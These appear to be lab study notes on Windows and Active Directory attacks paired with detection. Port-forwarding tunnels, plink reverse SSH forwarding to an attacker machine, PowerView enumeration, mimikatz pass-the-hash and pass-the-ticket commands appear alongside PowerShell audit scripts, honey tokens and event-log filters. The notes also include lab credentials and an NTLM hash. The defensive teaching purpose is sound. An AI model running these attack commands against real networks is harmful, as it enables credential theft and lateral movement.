netsh interface portproxy add v4tov4 listenport=21 listenaddress=172.16.50.11 connectport=3306 connectaddress=172.16.50.12

netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=172.16.50.11 localport=21 action=allow
```

```bash
mysql --host=192.168.50.40 --port=21 -uroot -pMkiuCbQ2F6kMkC 
```

```
show databases;
```

Inspect the Event Log and firewall rules that were added

```pwsh
Get-WinEvent -FilterHashtable @{LogName = 'Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'} -MaxEvents 20
```

Listing all the firewall rules on the host

```pwsh
Get-NetFirewallRule -Direction Inbound | Select-Object -Property DisplayName,Profile,Enabled | Where { $_.Enabled -eq 'True'}
```

```pwsh
Get-NetFirewallRule -DisplayName "forward_port_rule"
```

```pwsh
Get-NetFirewallRule -DisplayName "forward_port_rule" | Get-NetFirewallPortFilter
```

Inspect the configuration of the `portproxy` interface

```pwsh
netsh interface portproxy show v4tov4
```

Transfer the `plink.exe` binary to the compromised host. This is an SSH and Telnet client that the attacker can use to perform a remote port forward. The goal of the tunnel is to map the local SMB port on the attacker machine and allow the attacker to inspect the network shares.

```pwsh
echo y | plink.exe -ssh -N -l kali -pw toor -R 192.168.48.2:1234:127.0.0.1:445 192.168.48.2 
```

If the attack was successful, port `1234` should be listening on our attacker01 machine.

```bash
ss -antp | grep 1234
```

View the shares available on the host

```bash
smbclient -L 127.0.0.1 --port=1234 --user=Administrator
```

This host also exposes the `htdocs` folder => mount the folder

```bash
sudo mkdir /root/share/
sudo mount -t cifs -o username=Administrator,port=1234 //127.0.0.1/htdocs /root/share
sudo ls -l /root/share
```

```pwsh
Get-SysmonEvent | Where-Object { $_.Message -like "*plink*" 
```

```pwsh
Get-SysmonEvent 1 "1/31/2022 11:46:12" "2/1/2022 12:02:39" | Where-Object { $_.Message -like "*plink*" } | Format-List
```

# Active Directory Enumeration

By default, `DirectorySearcher` instantiates this object with the `Filter` property to the value of `(objectClass=*)`, which is an LDAP query that effectively returns every entry within a directory service.

Result of executing the query contains the domain controller.

```pwsh
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.Filter = '(distinguishedName=CN=DC-2,OU=Domain Controllers,DC=corp,DC=com)'
$Searcher.FindOne()
$Searcher.FindAll()
```

Use this script under the context of another user

```pwsh
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=com", 'corp\jdoe','Qwerty09!')
$Searcher.Filter = '(&(objectClass=computer)(cn=*dc*))'
$Searcher.FindAll()
```

## Enumerating Active Directory with PowerView

```pwsh
powershell -exec bypass
. .\PowerView.ps1
```

```pwsh
Get-NetDomainController
```

```pwsh
Get-NetGroupMember -Identity 'Domain Admins'
```

## Detecting Active Directory Enumeration

### Auditing Object Access

List audit policy categories that are configurable on the current system 

```pwsh
auditpol /list /category
```

Each category also contains a number of subcategories 

```pwsh
auditpol /list /subcategory:*
```

To configure an audit policy for Active Directory leverage the DS Access subcategory called `Directory Service Access`.

By default, this audit policy category is enabled to alert on success events.

A success event assumes that the action that took place was successful.

Confirm that `Directory Service Access` is enabled.

```pwsh
auditpol /get /subcategory:"Directory Service Access"
```

`audit entry` will determine when a specific event will be raised.


The 5 critical audit entry elements are:

| ELEMENT        | DESCRIPTION |
| -------------- | ----------- |
| Principal      | The identity that is being targeted for auditing |
| Type           | Target success, failure, or both types of events |
| Access         | Types of permissions that can be granted (and tracked) |
| Inherited From | Designates whether an audit entry was configured at a higher level than the target object, which would recurse down to any sub entries. |
| Applies To     | Designates whether the entry is targeting only the current object, descendant objects, or specific object types |


To identify when an individual is enumerating AD, leverage the `security principal` element. While we could create audit entries to target a specific account, use the `Everyone` security principal, which is all encompassing.

The `Applies to` element allows us to define which object we are targeting, whether it’s the current object, the current object and descendants (such as objects under an organizational unit), or even a specifically-named object.

The advanced security options allow us to define very granular controls where we can lock down access to an object as a whole, or access to its properties, for a given security principal.

These granular options extend to the auditing component, allowing us to define which operation we want to alert on.

Configure the audit settings for individual objects.

1. Log on to the domain controller and open `Active Directory Users and Computers` (ADUC).
2. Expand the domain root, navigate to `Domain Controllers` and right click `DC-2` to select `Properties`
3. With the `Properties` window open, select `Security` and click `Advanced` on the bottom left
4. With the `Advanced Security Settings` window open, click on the `Auditing` tab.
5. Click on `Add` to create a new auditing policy.
7. Click `Select a principal` and entering `Everyone`.
8. To raise an event when someone has successfully enumerated AD, select the `Success` type.
9. Keep `Applies to` element at the default value for now.
10. The `access` component is split between `permissions` and `properties` for the given object. (Directory service entries are called objects and entry attributes are called properties).
11. To flag access to a given object, ensure that `List contents`, `Read all properties`, and `Read permissions` are checked.
12. Select `Apply` and `OK` to finalize our audit entry.

To test if this works, run a quick LDAP script to query our target object.

```pwsh
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.Filter = '(distinguishedName=CN=DC-2,OU=Domain Controllers,DC=corp,DC=com)'
$Searcher.FindOne()
```

Open the Event Viewer to find an event `4662` under the security log which details the `An operation was performed on an object` action

The `Subject` provides us the account that accessed this object.
`Object` provides us details about the object that was accessed.
`Operation` provides us the details of what operation took place against the object.

Security principals are listed using their security identifiers (SID).

A directory service object is listed using their object GUID.

### Baseline Monitoring

Within the context of AD enumeration, our established baseline will consist of accounts that are expected to access certain objects.

E.g. The `offsec` account for the `corp` domain is supposed to be regularly querying the `Domain Admins` group.

Once we've set up an **audit entry** for the `Domain Admins` group, find this access in the event logs by filtering for `4662`.

In a large environment, this log can become quite busy and it is unrealistic to assume we can find relevant entries manually.

=> Use of the `Get-WinEvent` PowerShell cmdlet and introduce the concept of `XPath` filters.

XPath is a query language that allows us to select specific nodes from an XML document.

When we filter a security log, we are essentially using Event Viewer to build an XPath query that is parsed by the logging engine to provide the requested data.

E.g. Query the security log for all `4662` event IDs and only return results in which the `SubjectUserSid` value is that of our `offsec` account, the `ObjectName` is the `ObjectGUID` of our `Domain Admins` group, and the `OperationType` is `Object Access`.

The `ObjectSid` and `ObjectGUID` values can be located from the ADUC menu by opening `Properties` on the object and navigating to `Attribute Editor`.


```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[(EventID=4662)]] and *[EventData[(Data[@Name='SubjectUserSid']='S-1-5-21-2154860315-1826001137-329834519-1107')]] and *[EventData[(Data[@Name='ObjectName']='%{0ca1d341-b9ee-4d46-ab3b-3a2732aa4b51}')]] and *[EventData[(Data[@Name='OperationType']='Object Access')]]
   </Select>
  </Query>
</QueryList>
'@
```

A well-documented environment can build a baseline of expected object access based on known security principals and common work hours (resource-intensive)

Modify our XPath filter to include a `Suppress` tag to instruct the engine to not provide results where `SubjectUserName` is that of our expected `offsec` user.

`.\Baseline-Unexpected.ps1`

```pwsh
Function Get-GuidName ($Guid) {
    Begin {
        $ObjectTable = @{
            '%{0ca1d341-b9ee-4d46-ab3b-3a2732aa4b51}' = 'Domain Admins'
        }
    }
    Process {
        $Value = $ObjectTable[$Guid]
        If (!$Value) {
            $Value = $Guid
        }
    }
    End {
        return $Value
    }
}

Function Get-AccessName ($AccessMask) {
    Begin {
        $AccessTable = @{
            '0x10' = 'Read Property'
            '0x20000' = 'READ_CONTROL'
        }
    }
    Process {
        $Value = $AccessTable[$AccessMask]
        If (!$Value) {
            $Value = $AccessMask
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[(EventID=4662)]]
     and
     *[EventData[(Data[@Name='ObjectName']='%{0ca1d341-b9ee-4d46-ab3b-3a2732aa4b51}')]]
     and
     *[EventData[(Data[@Name='OperationType']='Object Access')]]
   </Select>
   <Suppress Path="Security">
    *[EventData[(Data[@Name='SubjectUserSid']='S-1-5-21-2154860315-1826001137-329834519-1107')]]
   </Suppress>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $SubjectUserName = $XML.Event.EventData.Data[1].'#text'
   $ObjectName = Get-GuidName $($XML.Event.EventData.Data[6].'#text')
   $AccessMask = Get-AccessName $($XML.Event.EventData.Data[10].'#text')
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'SubjectUserName' = $SubjectUserName; 'ObjectName' = $ObjectName; 'AccessMask' = $AccessMask }
}
```

### Using Honey Tokens

A honey token is a collection of different types of objects that we will create throughout the directory to lure an attacker's interaction.

=> Only care about are the object access events to any of these tokens, from any account

E.g.

| OBJECT TYPE |	NAME |
| ----------- | ---- |
| Computer    |	HoneySrv01 |
| Computer    |	HoneyPC01 |
| User        |	HoneyUser01 |
| User        |	HoneySvc01 |
| Group       |	HoneySecGroup01 |
| Group       |	HoneyDistGroup01 |


`.\Honey-Tokens.ps1`

```pwsh
Function Get-GuidName ($Guid) {
    Begin {
        $ObjectTable = @{
            '%{a11236c4-e6ae-4dc7-ad58-92b6b6b5f83d}' = 'HoneySrv01'
            '%{a1a88fa6-e570-4520-9b21-6bad8483979b}' = 'HoneyPC01'
            '%{6e1648e7-b100-4bdf-b497-7061e8d7a068}' = 'HoneyUser01'
            '%{74215987-5fa5-4e36-b4d2-c9fdc5fca747}' = 'HoneySvc01'
            '%{c2e86461-de97-4ef5-881c-e6ccfb97df5d}' = 'HoneySecGroup01'
            '%{02f71039-cf2c-47a8-aeeb-ff257851f149}' = 'HoneyDistGroup01'
        }
    }
    Process {
        $Value = $ObjectTable[$Guid]
        If (!$Value) {
            $Value = $Guid
        }
    }
    End {
        return $Value
    }
}

Function Get-AccessName ($AccessMask) {
    Begin {
        $AccessTable = @{
            '0x10' = 'Read Property'
            '0x20000' = 'READ_CONTROL'
        }
    }
    Process {
        $Value = $AccessTable[$AccessMask]
        If (!$Value) {
            $Value = $AccessMask
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[(EventID=4662)]] 
     and 
     *[EventData[(Data[@Name='OperationType']='Object Access')]]
     and
     *[EventData[Data[@Name='ObjectName'] and (Data='%{02f71039-cf2c-47a8-aeeb-ff257851f149}' or 
     Data='%{a1a88fa6-e570-4520-9b21-6bad8483979b}' or Data='%{6e1648e7-b100-4bdf-b497-7061e8d7a068}' or
     Data='%{74215987-5fa5-4e36-b4d2-c9fdc5fca747}' or Data='%{c2e86461-de97-4ef5-881c-e6ccfb97df5d}' or
     Data='%{02f71039-cf2c-47a8-aeeb-ff257851f149}')]]
   </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $SubjectUserName = $XML.Event.EventData.Data[1].'#text'
   $ObjectName = Get-GuidName $($XML.Event.EventData.Data[6].'#text')
   $AccessMask = Get-AccessName $($XML.Event.EventData.Data[10].'#text')
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'SubjectUserName' = $SubjectUserName; 'ObjectName' = $ObjectName; 'AccessMask' = $AccessMask }
}
```

# Windows Lateral Movement

## Pass The Hash

```
privilege::debug
sekurlsa::logonPasswords full
sekurlsa::pth /domain:corp.com /user:offsec /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:powershell
```

```pwsh
C:\Users\mary\Desktop\Lateral_Movement\PsExec64.exe /accepteula \\DC01 cmd.exe
```

Examine these 3 components:
- The local authentication event generated from the PTH
- The system changes made by PsExec
- The remote authentication event generated by PsExec

Inspecting the local authentication event.

- If a user account is successfully impersonated (such as with the `pth` command from the `sekurlsa` module), a logon event is generated on the machine it occurred on, specifically event ID `4624`.

Event ID 4624 is accessible thanks to the `Logon/Logoff` audit policy.

By default, these events are configured to monitor for both success and failure events.

Verify the audit policy is configured to monitor the success logon events

```pwsh
auditpol /get /category:"Logon/Logoff"
```

Since the audit policy is enabled, the PTH attack triggered a `4624` event on `client03`.

- `Subject` field lists the account that initiated the authentication event.
- `Logon Type` indicates the type of logon that occurred.
- `New Logon` field lists the account, the initiated impersonation event, and the targeted account.


The logon type `9`, which is a `NewCredentials` logon type. This is generated when a new session is established with the same local identity as the initiator, but uses a different identity for network connections.

For clarification, when we run whoami from the spawned process, the ouput reveals that we are running as `mary`. However, when we execute PsExec in the same process, it opens a shell as `offsec`.

Create an audit script to extract logon type `9` events from the instances where event ID `4624` is triggered with the following XPath XML filter:

```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4624)]]
    and 
    *[EventData[Data[@Name='LogonType'] and (Data='9')]]
    </Select>
  </Query>
</QueryList>
```

Execute the script on client03 from an administrative PowerShell prompt

`.\Audit-NewCredentialsLogons.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
    *[System[(EventID=4624)]]
    and 
    *[EventData[Data[@Name='LogonType'] and (Data='9')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $SubjectUserName = $XML.Event.EventData.Data[1].'#text'
   $TargetUserName = $XML.Event.EventData.Data[22].'#text'
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'SubjectUserName' = $SubjectUserName; 'TargetUserName' = $TargetUserName; ; }
}
```

Examine the execution of PsExec:

- When PsExec is executed successfully, it will connect to the target's `admin$` network share and create a `PSEXESVC.exe` file.

- When this service is installed, it will trigger event `7045` in the system log on the target machine.

- If the service starts successfully, we'll find event `7036` in the system log of the target machine.

Detect the usage of PsExec within the network (Execute the script on DC01)

`.\Audit-PsExec.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">
    *[System[(EventID=7045)]]
    and
    *[EventData[Data[@Name='ServiceName'] and (Data='PSEXESVC')]]
    or
    *[System[(EventID=7036)]]
    and
    *[EventData[Data[@Name='param1'] and (Data='PSEXESVC')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
  [xml]$XML = $L.toXml()
  $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
  $EventId = $XML.Event.System.EventID.'#text'
  If ($EventId -eq '7045') {
    $ServiceName = $XML.Event.EventData.Data[0].'#text'
    $ServiceBinary = $XML.Event.EventData.Data[1].'#text'
    $ServiceAccount = $XML.Event.EventData.Data[4].'#text'
    $Details = "Service $ServiceName installed using $ServiceBinary as $ServiceAccount"
  }
  Else {
    $ServiceName = $XML.Event.EventData.Data[0].'#text'
    $ServiceStatus = $XML.Event.EventData.Data[1].'#text'
    $Details = "Service $ServiceName is $ServiceStatus"
  }
   
  [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'Event' = $EventId; 'Details' = $Details; ; }
}
```

A `4624` event will be registered on the target machine with logon type `3`, or a Network logon.

`.\Audit-NetworkLogons.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4624)]]
    and 
    *[EventData[Data[@Name='LogonType'] and (Data='3')]]
    and 
    *[EventData[Data[@Name='AuthenticationPackageName'] and (Data='NTLM')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $TargetUserName = $XML.Event.EventData.Data[5].'#text'
   $WorkstationName = $XML.Event.EventData.Data[11].'#text'
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'WorkstationName' = $WorkstationName;}
}
```

`Audit-PsExec.ps1` + `Audit-NetworkLogon.ps1` =  `Audit-PassTheHash.ps1`

`.\Audit-PassTheHash.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
    *[System[(EventID=4624)]]
    and 
    *[EventData[Data[@Name='LogonType'] and (Data='3')]]
    and 
    *[EventData[Data[@Name='AuthenticationPackageName'] and (Data='NTLM')]]
    </Select>
  </Query>
  <Query Id="1" Path="System">
    <Select Path="System">
    *[System[(EventID=7045)]]
    and
    *[EventData[Data[@Name='ServiceName'] and (Data='PSEXESVC')]]
    or
    *[System[(EventID=7036)]]
    and
    *[EventData[Data[@Name='param1'] and (Data='PSEXESVC')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
  [xml]$XML = $L.toXml()
  $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
  $EventId = $XML.Event.System.EventID.'#text'
  If (!$EventId) {
    $EventId = $XML.Event.System.EventID
  }
   
  Switch ($EventId) {
    '7036' {
      $ServiceName = $XML.Event.EventData.Data[0].'#text'
      $ServiceStatus = $XML.Event.EventData.Data[1].'#text'
      $Details = "Service $ServiceName is $ServiceStatus"
    }
    '7045' {
      $ServiceName = $XML.Event.EventData.Data[0].'#text'
      $ServiceBinary = $XML.Event.EventData.Data[1].'#text'
      $ServiceAccount = $XML.Event.EventData.Data[4].'#text'
      $Details = "Service $ServiceName installed using $ServiceBinary as $ServiceAccount"
    }
    '4624' {
      $TargetUserName = $XML.Event.EventData.Data[5].'#text'
      $WorkstationName = $XML.Event.EventData.Data[11].'#text'
      $Details = "$TargetUsername logged in remotely from $WorkstationName"
    }
    
  }
  [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'Event' = $EventId; 'Details' = $Details; ; }
}
```

## Brute Force Domain Credentials

To differentiate between malicious and legitimate password failures, we’ll implement 2 approaches.

1. Enumerate AD for `badPwdCount` attribute.

The `badPwdCount` attribute is an integer that is incremented every time an AD logon failure occurs due to a bad password. By default, this value is set to `0`.

When a failure occurs, the DC that processes the authentication failure will forward the authentication request to the DC that has the `PDC` emulator role.

A PDC is the authoritative DC for the domain.

=> Any inconsistencies (including outdated information), are resolved at the PDC.

E.g., If a password is changed and a replication conflict occurs, the PDC serves as the final authority.

If the PDC confirms a failed login attempt, it will increment the value of the `badPwdCount` attribute. The value of this attribute is not replicated across all the domain controllers, instead the PDC maintains accumulated values for each account in the domain.

The PDC will not **reset** this value to `0` (even after a password change) until a **successful** login occurs.

2 LDAP search filters.

1. Searches for a specific username via the `sAMAccountName` attribute.=> create a `-Username` parameter in our function.

2. Search through all user objects (`userAccountControl` does not have a value of `2`, => it's not disabled) => `-List` parameter

```pwsh
. .\Get-BadPwdCount.ps1
Get-BadPwdCount -List | Sort BadPwdCount -Descending
```

```pwsh
function Get-BadPwdCount {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false, ParameterSetName = 'List')]
        [switch]$List,
        [Parameter(Mandatory = $false, ParameterSetName = 'List')]
        [string]$Username,
        [Parameter(Mandatory = $false, ParameterSetName = 'Statistics')]
        [string]$Expected
    )
    Begin { 
        # Only query against the PDC to ensure our results are accurate
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $PDC = $Domain.PdcRoleOwner
        $SearchRoot = "LDAP://{0}/DC={1}" -f $PDC,$Domain.Name.Replace('.',',DC=')
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchRoot)

        # Only pull down the two attributes we need
        $Searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
        $Searcher.PropertiesToLoad.Add("badPwdCount") | Out-Null
        $Searcher.PageSize = 1000

        # Targeted user or every enabled user account
        If ($Username) {
            $Searcher.Filter = "(sAMAccountName=$Username)"
        } else {
            $Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        }
        $Users = $Searcher.FindAll()
    }
    Process {       
        # Output all, or a designated sAMAccountName and their badPwdCount value
        if ($List) {
            $Results = $Users | Where-Object { $_.Properties.badpwdcount -gt 0 } | ForEach-Object {
                [PSCustomObject]@{'SamAccountName' = $($_.Properties.samaccountname); 'BadPwdCount' = $($_.Properties.badpwdcount) }
            }
        }

        # Output percentage of all enabled accounts that have a badPwdCount value greater than 0
        if (!$List) {
            $BadPwdCount = $($Users | Where-Object { $_.Properties.badpwdcount -gt 0 }).Count
            $Actual = [math]::Round($BadPwdCount / $Users.Count * 100, 2)
            $Results = [PSCustomObject]@{'TotalUsers' = $Users.Count; 'Expected' = "$Expected%"; 'Actual' = "$Actual%" }
        }
    }
    End { 
        return $Results
    }
}
```

View the currently-configured lockout threshold

```pwsh
net accounts
```

A lockout will trigger event `4740`

Log on on to DC01 and run from an adminstrative PowerShell prompt

`.\Audit-Lockouts.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
    *[System[(EventID=4740)]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
  [xml]$XML = $L.toXml()
  $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
  $TargetUserName = $XML.Event.EventData.Data[0].'#text'
  $CallerWorkstation = $XML.Event.EventData.Data[1].'#text'
  $AnsweringDC = $XML.Event.EventData.Data[4].'#text'
  [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'CallerWorkstation' = $CallerWorkstation; 'AnsweringDC' = $AnsweringDC
  }
}
```

When a user fails to log on to a computer, a `4625` failure event is generated on their workstation. In some cases, we could retrieve these events from a DC, but they are not configured by default.

Configure our DC to generate these events by enabling the `Other Account Logon Events` subcategory of the `Account Logon` audit policy

```pwsh
auditpol /set /subcategory:"Other Account Logon Events" /success:enable /failure:enable
```

As long as this policy was enabled before the failures took place, we can use the following XPath XML filter to extract the logon failures for a specific username.

```pwsh
.\Audit-TargetedFailedLogons.ps1 | Group-Object WorkstationName | Select Name,Count
```

```pwsh
Function Get-FailureReason ($StatusCode) {
    Begin {
        $StatusTable = @{
            '0xC000006A' = 'User logon with misspelled or bad password'
            '0XC000006D' = 'The cause is either a bad username or authentication information'
        }
    }
    Process {
        $Value = $StatusTable[$StatusCode]
        If (!$Value) {
            $Value = $StatusCode
        }
    }
    End {
        return $Value
    }
}
    
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
    *[System[(EventID=4625)]]
    and
    *[EventData[Data[@Name='TargetUserName'] and (Data='jim')]]
    </Select>
  </Query>
</QueryList>
'@
    
$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
    [xml]$XML = $L.toXml()
    $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
    $TargetUserName = $XML.Event.EventData.Data[5].'#text'    
    $FailureReason = Get-FailureReason -StatusCode $($XML.Event.EventData.Data[9].'#text')
    $LogonType = $XML.Event.EventData.Data[10].'#text'
    $WorkstationName = $XML.Event.EventData.Data[13].'#text'
    [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'FailureReason' = $FailureReason; 'LogonType' = $LogonType ; 'WorkstationName' = $WorkstationName 
    }
}
```

The `Logon Type` represents the type of logon that occurred, type `3`.
The `Account For Which Logon Failed` section lists the account that attempted a logon.
The `Failure Information` section describes what triggered the failure.

```pwsh
.\Audit-TargetedFailedLogons.ps1
```

To avoid triggering lockout events, utilize **password spraying**, which can be accomplished with tools such as **Spray-Passwords** that leverages native assemblies.

This tool can be configured to operate within a configured lockout threshold. If this tool is used in an attack, the `Audit-TargetedFailedLogons` script would not detect any lockouts.

However the `badPwdCount` count would likely increase due to the password spraying.

Use a statistical approach that considers the percentage of all domain accounts with a `badPwdCount` value greater than 0.

Establish a baseline over a period of time to determine the average expected failure percentage.

E.g. Assume that our network has a standard 10% failure threshold.

Switch to DC01 as the offsec user to obtain statistics on failed logons from all `badPwdCount` fields versus the number of users in the domain.

```pwsh
. .\Get-BadPwdCount.ps1
Get-BadPwdCount -Expected 10
```

Output a list of the accounts with failed logins and the workstation they occurred on.

```pwsh
.\Audit-FailedLogons.ps1 | Group-Object WorkstationName | Select Name,Count
```

```pwsh
Function Get-FailureReason ($StatusCode) {
    Begin {
        $StatusTable = @{
            '0xC000006A' = 'User logon with misspelled or bad password'
            '0XC000006D' = 'The cause is either a bad username or authentication information'
        }
    }
    Process {
        $Value = $StatusTable[$StatusCode]
        If (!$Value) {
            $Value = $StatusCode
        }
    }
    End {
        return $Value
    }
}
    
$FilterXML = @'
    <QueryList>
      <Query Id="0" Path="Security">
        <Select Path="Security">*[System[(EventID=4625)]]</Select>
      </Query>
    </QueryList>
'@
    
$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
    [xml]$XML = $L.toXml()
    $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
    $SubjectUserName = $XML.Event.EventData.Data[1].'#text'
    $TargetUserName = $XML.Event.EventData.Data[5].'#text'    
    $FailureReason = Get-FailureReason -StatusCode $($XML.Event.EventData.Data[9].'#text')
    $LogonType = $XML.Event.EventData.Data[10].'#text'
    $WorkstationName = $XML.Event.EventData.Data[13].'#text'
    [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'FailureReason' = $FailureReason; 'LogonType' = $LogonType ; 'WorkstationName' = $WorkstationName 
    }
}
```

## Terminal Services

By default, there are 2 logs that will trace these remote connection events, namely `TerminalServices-LocalSessionManager` and `TerminalServices-RemoteConnectionManager`.

- The `Local Session Manager` logs will include information about the local terminal session on the current machine.

- The `Remote Connection Manager` logs will include information about the terminal sessions events that were triggered from a remote computer.

When a computer on the domain uses RDP to connect to another machine, both of these logs will have events raised on the machine that’s being accessed remotely, not the local initiating machine.

Once the RDP listener on the remote machine receives the initial connection request, the **RDP logon prompt** is displayed. When this happens, event ID `261` is raised in the `Remote Connection Manager` logs to indicate that this took place.

E.g. When it occurs on a machine that is not a typical destination for RDP connections.

If a subsequent connection successfully authenticates and connects to the remote machine, event ID `1149` will be generated, containing information about who logged in and from where.

Extract and parse out the information we need with the XPath XML filter

```xml
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational">
    <Select Path="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational">
      *[System[(EventID=1149)]]
   </Select>
  </Query>
</QueryList>
}
```

Start a RDP connection to SERVER04. When the RDP connection is established, execute the terminal services audit script on SERVER04.

`.\Audit-TerminalServices.ps1`

```pwsh
$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational">
    <Select Path="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational">
     *[System[(EventID=1149)]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $TargetUserName = $XML.Event.UserData.EventXML.Param1
   $Domain = $XML.Event.UserData.EventXML.Param2
   $Source = $XML.Event.UserData.EventXML.Param3
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'Domain' = $Domain; 'Source' = $Source }
}
```

## Pass The Ticket

On server04 as offsec

```bat
dir \\dc01\c$
klist
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
copy "...-offsec@krbtgt-CORP.COM.kirbi" 1.kirbi
```

On client03 as mary

```pwsh
copy \\server04\users\offsec\desktop\lateral_movement\1.kirbi .
mimikatz.exe "kerberos::ptt 1.kirbi" exit
klist
dir \\dc01\c$
```

We have successfully stolen the TGT for the offsec user and are able to use it as mary.

Leverage our DC logs to help us track the instances in which a TGT is stolen and used on a different machine.

When a KDC issues a TGT, the DC will raise event ID `4768`.

When a client makes a TGS request, the domain controller will raise event ID `4769`.

Both of these events are provided by the `Kerberos Service Ticket Operations` audit policy, which is a subcategory of `Account Logon`, which we can display on DC01.

```pwsh
auditpol /get /category:"Account Logon
```

By default, these events are logged on the domain controller when triggered.

Trigger event `4768` by logging on to a machine with a valid username and password.

`Account Information` lists the user that issued the TGT request and `Network Information` lists the client machine's address and port.

Trigger a TGS request to raise event `4769` by browsing to the `c$`share of a domain machine we have access to, such as `\\server04\c$`

Determine whether or not a TGS request has been initiated from a machine that has a valid, previous TGT request:

1. Extract `4678` events to get a list of the TGT events and the associated username and information about the source machine.

2. Extract the `4769` events for the TGS events.

3. Compare every TGS request and flag the instances in which a TGT request doesn’t exist with the same username and client IP address.

Run the audit script on DC01 to detect instances of a stolen ticket being used on the network

`.\Audit-PassTheTicket.ps1`

```pwsh
Function Get-TGT {
  Begin {
    $TGT = @()
    $FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[band(Keywords,9007199254740992) and (EventID=4768)]]
   </Select>
  </Query>
</QueryList>
'@
  }
  Process {
    $Logs = Get-WinEvent -FilterXml $FilterXML
    ForEach ($L in $Logs) {
      [xml]$XML = $L.toXml()
      $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
      $TargetUserName = $XML.Event.EventData.Data[0].'#text'
      $IPAddress = $($XML.Event.EventData.Data[9].'#text')
      If ($IPAddress -eq '::1') {
        $IPAddress = $(Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select -ExpandProperty IPv4Address).IPAddressToString
      }
      else {
        $IPAddress = $IPAddress.split('::ffff:')[-1]
      }
      $TGT += [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'IPAddress' = $IPAddress }
    }
  }
  End {
    return $TGT
  }
}
